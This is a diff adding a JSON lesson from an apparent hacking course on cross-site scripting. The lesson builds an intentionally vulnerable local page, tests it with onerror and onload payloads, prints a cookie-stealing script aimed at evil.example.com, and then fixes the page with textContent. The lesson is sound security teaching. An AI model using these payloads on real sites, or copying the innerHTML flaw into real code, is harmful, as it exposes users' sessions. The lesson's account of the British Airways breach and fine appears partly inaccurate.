@@ -1,0 +1,76 @@
+{
+  "id": 18,
+  "slug": "xss-cross-site-scripting",
+  "title": "XSS — Cross-Site Scripting",
+  "module": 5,
+  "moduleName": "Web & App Security",
+  "difficulty": "Hacker",
+  "objective": "Understand what Cross-Site Scripting (XSS) is, the difference between reflected and stored XSS, and how to prevent it using escaping and Content Security Policy.",
+  "legalWarning": "Only test websites and applications you own or have explicit permission to test. Unauthorized access to web applications is illegal.",
+  "explanation": "Cross-Site Scripting — or XSS — is one of the most common web vulnerabilities in the world, and it's been in the OWASP Top 10 for over two decades. The idea is simple but devastating: an attacker injects malicious JavaScript code into a web page that other users view.\n\nThere are two main types. Reflected XSS happens when user input is immediately reflected back in the page without sanitization. Imagine a search page that shows 'You searched for: cats' — if it doesn't sanitize the input, an attacker could craft a URL like search?q=<script>alert('hacked')</script> and the script would execute in anyone's browser who clicks that link. Stored XSS is worse — the malicious script gets saved in the website's database (like in a comment or profile field) and runs every time someone views that content.\n\nWhy is XSS dangerous? Because JavaScript running in a user's browser has access to their cookies, their session tokens, and can make requests on their behalf. An attacker could steal login sessions, redirect users to fake sites, modify page content, or install keyloggers — all invisibly.\n\nIn this lesson, you'll create a deliberately vulnerable HTML page on YOUR OWN computer to see XSS in action. This is called an 'intentionally vulnerable application' — security professionals build these all the time for training. You'll type a script tag into an input field and watch it execute. Then you'll fix the vulnerability.\n\nThe two main defenses against XSS are output encoding (converting characters like < and > to their HTML entity equivalents so they display as text instead of executing as code) and Content Security Policy (CSP) headers, which tell the browser which scripts are allowed to run. Modern frameworks like React and Angular escape output by default, which is why they're considered safer — but developers can still bypass these protections accidentally.\n\nRemember: you're only testing YOUR OWN local HTML file. Never try XSS on websites you don't own — it's a federal crime under computer fraud laws in most countries.",
+  "commands": [
+    {
+      "command": "cat > ~/web-lab/xss-vulnerable.html << 'HTMLEOF'\n<!DOCTYPE html>\n<html>\n<head><title>XSS Lab - Vulnerable Page</title></head>\n<body>\n<h1>Guest Book (VULNERABLE - DO NOT USE IN PRODUCTION)</h1>\n<input type=\"text\" id=\"userInput\" placeholder=\"Type your name\" size=\"50\">\n<button onclick=\"document.getElementById('output').innerHTML = 'Hello, ' + document.getElementById('userInput').value + '!'\">Submit</button>\n<div id=\"output\" style=\"margin-top:20px; padding:10px; border:1px solid #ccc;\"></div>\n<p style=\"color:red;\"><strong>WARNING:</strong> This page is intentionally vulnerable for learning purposes only.</p>\n</body>\n</html>\nHTMLEOF",
+      "description": "Creates a deliberately vulnerable HTML page with an input field that doesn't sanitize user input. The innerHTML assignment directly inserts whatever the user types — including script tags.",
+      "expectedOutput": "hackeryoung@kali:~$",
+      "safety": "safe",
+      "troubleshooting": "If the file isn't created, make sure ~/web-lab directory exists: 'mkdir -p ~/web-lab'. Check with 'cat ~/web-lab/xss-vulnerable.html' to confirm.",
+      "legalNote": null
+    },
+    {
+      "command": "cd ~/web-lab && python3 -m http.server 8080 &",
+      "description": "Starts the local web server so you can view the vulnerable page in a browser at http://localhost:8080/xss-vulnerable.html.",
+      "expectedOutput": "Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...",
+      "safety": "safe",
+      "troubleshooting": "If port 8080 is busy, kill the old server first: 'kill $(lsof -t -i:8080)' then try again.",
+      "legalNote": null
+    },
+    {
+      "command": "echo 'Now open Firefox and go to: http://localhost:8080/xss-vulnerable.html'\necho 'In the input field, type: <img src=x onerror=alert(\"XSS\")>'\necho 'Click Submit and watch what happens!'",
+      "description": "Instructions for testing reflected XSS. The <img> tag with an invalid src triggers the onerror handler, which executes JavaScript. This works because innerHTML doesn't block event handlers.",
+      "expectedOutput": "Now open Firefox and go to: http://localhost:8080/xss-vulnerable.html\nIn the input field, type: <img src=x onerror=alert(\"XSS\")>\nClick Submit and watch what happens!",
+      "safety": "restricted",
+      "troubleshooting": "If the alert doesn't pop up, try a different payload: <svg onload=alert('XSS')>. Some browsers have basic XSS filters, but they won't catch everything.",
+      "legalNote": "This demonstration is ONLY for your local test page. Never attempt XSS injection on websites you do not own — it is illegal under the Computer Fraud and Abuse Act and similar laws worldwide."
+    },
+    {
+      "command": "echo '<script>document.location=\"http://evil.example.com/steal?cookie=\"+document.cookie</script>' | cat",
+      "description": "Shows (but does NOT execute) what a real cookie-stealing XSS payload looks like. An attacker would inject this into a vulnerable page to redirect the victim to a malicious server, sending their cookies along.",
+      "expectedOutput": "<script>document.location=\"http://evil.example.com/steal?cookie=\"+document.cookie</script>",
+      "safety": "restricted",
+      "troubleshooting": null,
+      "legalNote": "This is shown for educational purposes only. Stealing cookies from other users is theft and a federal crime. NEVER use this payload on any real website."
+    },
+    {
+      "command": "cat > ~/web-lab/xss-safe.html << 'HTMLEOF'\n<!DOCTYPE html>\n<html>\n<head><title>XSS Lab - SAFE Page</title></head>\n<body>\n<h1>Guest Book (FIXED VERSION)</h1>\n<input type=\"text\" id=\"userInput\" placeholder=\"Type your name\" size=\"50\">\n<button onclick=\"document.getElementById('output').textContent = 'Hello, ' + document.getElementById('userInput').value + '!'\">Submit</button>\n<div id=\"output\" style=\"margin-top:20px; padding:10px; border:1px solid #ccc;\"></div>\n<p style=\"color:green;\"><strong>SAFE:</strong> This page uses textContent instead of innerHTML — XSS is prevented.</p>\n</body>\n</html>\nHTMLEOF",
+      "description": "Creates the FIXED version of the same page. The only change: innerHTML is replaced with textContent, which treats all input as plain text — script tags are displayed as text instead of executing.",
+      "expectedOutput": "hackeryoung@kali:~$",
+      "safety": "safe",
+      "troubleshooting": "Compare both pages side by side: open xss-vulnerable.html and xss-safe.html in separate tabs. Try the same XSS payload in both — you'll see it only works on the vulnerable one.",
+      "legalNote": null
+    },
+    {
+      "command": "diff ~/web-lab/xss-vulnerable.html ~/web-lab/xss-safe.html",
+      "description": "Shows the exact difference between the vulnerable and safe versions. You'll see that the fix is just one word: innerHTML vs textContent. Security often comes down to choosing the right function.",
+      "expectedOutput": "< <button onclick=\"document.getElementById('output').innerHTML = ...\n---\n> <button onclick=\"document.getElementById('output').textContent = ...",
+      "safety": "safe",
+      "troubleshooting": null,
+      "legalNote": null
+    },
+    {
+      "command": "kill $(jobs -p) 2>/dev/null; echo 'Server stopped. Lab complete!'",
+      "description": "Stops the background web server. Always clean up when you're done with a lab.",
+      "expectedOutput": "Server stopped. Lab complete!",
+      "safety": "safe",
+      "troubleshooting": null,
+      "legalNote": null
+    }
+  ],
+  "challenge": {
+    "question": "A website has a search box. When you search for 'puppies,' the page shows 'Results for: puppies.' If you search for <b>puppies</b> and the word 'puppies' appears in bold, is the site vulnerable to XSS? Why?",
+    "hint": "If HTML tags in input are being rendered rather than displayed as text, what does that tell you about how the server handles input?",
+    "answer": "Yes, the site is very likely vulnerable to XSS. If <b> tags are rendered as bold text, it means the server is inserting user input directly into the HTML without escaping. If it renders <b>, it will almost certainly render <script> tags too. The server should either escape HTML entities (showing '<b>puppies</b>' as literal text) or use textContent instead of innerHTML."
+  },
+  "realWorld": "In 2018, a stored XSS vulnerability was found in British Airways' website that allowed attackers to inject a malicious script into the payment page. The Magecart group exploited this to steal credit card data from approximately 380,000 customers. British Airways was fined $230 million by the UK's Information Commissioner's Office — the largest GDPR fine at the time.",
+  "funFact": "The most famous XSS attack ever was the 'Samy Worm' on MySpace in 2005. A 19-year-old named Samy Kamkar wrote a stored XSS worm that added him as a friend on every profile that viewed it. Within 20 hours, he had over one million friends — making it the fastest-spreading virus in history. He was sentenced to community service and no internet access for 3 years."
+}
